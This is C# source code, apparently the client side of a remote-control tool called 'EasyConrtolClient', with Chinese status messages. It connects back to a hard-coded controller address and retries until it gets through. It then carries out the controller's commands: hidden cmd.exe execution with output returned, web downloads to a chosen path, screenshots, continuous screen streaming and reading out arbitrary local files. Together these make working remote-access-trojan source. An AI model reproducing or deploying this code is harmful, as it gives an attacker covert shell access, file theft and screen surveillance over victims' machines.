using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EasyConrtolClient
{
    class Program
    {
        private static byte[] ReadFile(String img)
        {
            FileInfo fileinfo = new FileInfo(img);
            byte[] buf = new byte[fileinfo.Length];
            FileStream fs = new FileStream(img, FileMode.Open, FileAccess.Read);
            fs.Read(buf, 0, buf.Length);
            fs.Close();
            GC.ReRegisterForFinalize(fileinfo);
            GC.ReRegisterForFinalize(fs);
            return buf;
        }
        static void Main(string[] args)
        {
            while (true)
            {
                string ip = "192.168.2.24";
                int port = 12345;
                TcpClient tcpClient = new TcpClient();
                while (!tcpClient.Connected)
                {
                    try
                    {
                        tcpClient.Connect(ip, port);
                    }
                    catch {  }
                }
                if (tcpClient.Connected)
                {
                    Console.WriteLine("已与远控端建立连接!");
                    while (tcpClient.Connected)
                    {
                        try
                        {
                            Stream stm = tcpClient.GetStream();
                            byte[] Array = new byte[1024];
                            int length = stm.Read(Array, 0, 1024);
                            string command = Encoding.Default.GetString(Array, 0, length);
                            switch ((Regex.Split(command, " "))[0])
                            {
                                case "cmd":
                                    byte[] request = null;
                                    string Cmd_Array = command.Replace("cmd", "");
                                    Process process = new Process();
                                    process.StartInfo.FileName = "cmd.exe";
                                    process.StartInfo.Arguments = "/c " + Cmd_Array;
                                    process.StartInfo.UseShellExecute = false;
                                    process.StartInfo.CreateNoWindow = true;
                                    process.StartInfo.RedirectStandardInput = true;
                                    process.StartInfo.RedirectStandardOutput = true;
                                    process.StartInfo.RedirectStandardError = true;
                                    process.Start();
                                    string strOuput = process.StandardOutput.ReadToEnd();
                                    if (strOuput == "") 
                                    {
                                        strOuput = process.StandardError.ReadToEnd();
                                        if (strOuput == "")
                                        {
                                            strOuput = "无回显...";
                                        }
                                    }
                                    request = Encoding.Default.GetBytes(strOuput);
                                    stm.Write(request, 0, request.Length);
                                    process.WaitForExit();
                                    process.Close();
                                    break;
                                case "webdownload":
                                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
                                    string[] Download_Array = Regex.Split(command, " ");
                                    string web_path = Download_Array[1];
                                    string web_download_path = Download_Array[2];
                                    WebRequest webrequest = WebRequest.Create(web_path);
                                    WebResponse webresponse = webrequest.GetResponse();
                                    Stream s = webresponse.GetResponseStream();
                                    StreamReader sr = new StreamReader(s, Encoding.GetEncoding("UTF-8"));
                                    string web_result = sr.ReadToEnd();
                                    File.WriteAllText(web_download_path, web_result, Encoding.UTF8);
                                    byte[] webdownload_result = Encoding.Default.GetBytes("Download Completed!");
                                    stm.Write(webdownload_result, 0, webdownload_result.Length);
                                    break;
                                case "screenshot":
                                    Bitmap baseImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                    Graphics g = Graphics.FromImage(baseImage);
                                    g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
                                    g.Dispose();
                                    baseImage.Save("./screenshot.jpg");
                                    byte[] screenshot_result = ReadFile("./screenshot.jpg");
                                    stm.Write(screenshot_result, 0, screenshot_result.Length);
                                    File.Delete("./screenshot.jpg");
                                    break;
                                case "screenshare":
                                    Thread screenshare = new Thread(() => 
                                    {
                                        while (true)
                                        {
                                            try
                                            {
                                                Stream stm_ = tcpClient.GetStream();
                                                byte[] Array_ = new byte[1024];
                                                int length_ = stm_.Read(Array_, 0, 1024);
                                                string command_ = Encoding.Default.GetString(Array_, 0, length_);
                                                if (command_ != "1")
                                                {
                                                    Bitmap baseImage_ = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                                    Graphics g_ = Graphics.FromImage(baseImage_);
                                                    g_.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
                                                    g_.Dispose();
                                                    using (MemoryStream memoryStream = new MemoryStream())
                                                    {
                                                        baseImage_.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);
                                                        byte[] imageBytes = memoryStream.ToArray();
                                                        stm.Write(imageBytes, 0, imageBytes.Length);
                                                    }
                                                    Thread.Sleep(100);
                                                }
                                                else { break; }
                                            }
                                            catch { break; }
                                        }
                                    });
                                    screenshare.Start();
                                    screenshare.Join();
                                    break;
                                case "download":
                                    byte[] download_result = ReadFile((Regex.Split(command, " "))[1]);
                                    stm.Write(download_result, 0, download_result.Length);
                                    break;
                                default:
                                    byte[] result = Encoding.Default.GetBytes("无效指令 有问题? 使用 help all 或者 help control");
                                    stm.Write(result, 0, result.Length);
                                    break;
                            }
                        }
                        catch { Console.WriteLine("当前连接已断开..."); }
                    }

                }

            }

        }
    }
}
